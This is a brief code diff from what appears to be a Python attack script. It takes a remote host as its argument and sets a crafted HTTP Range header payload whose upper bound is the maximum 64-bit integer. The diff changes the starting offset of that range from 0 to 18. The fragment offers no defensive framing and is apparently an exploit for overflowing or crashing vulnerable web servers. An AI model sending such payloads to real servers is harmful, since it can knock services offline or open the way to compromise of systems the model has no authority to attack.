@@ -16,7 +16,7 @@ def main(argv):
     if len(argv) < 2:
          return usage()
 
-    payload= "bytes=0-18446744073709551615"
+    payload= "bytes=18-18446744073709551615"
     rhost = sys.argv[1]
 
     try:
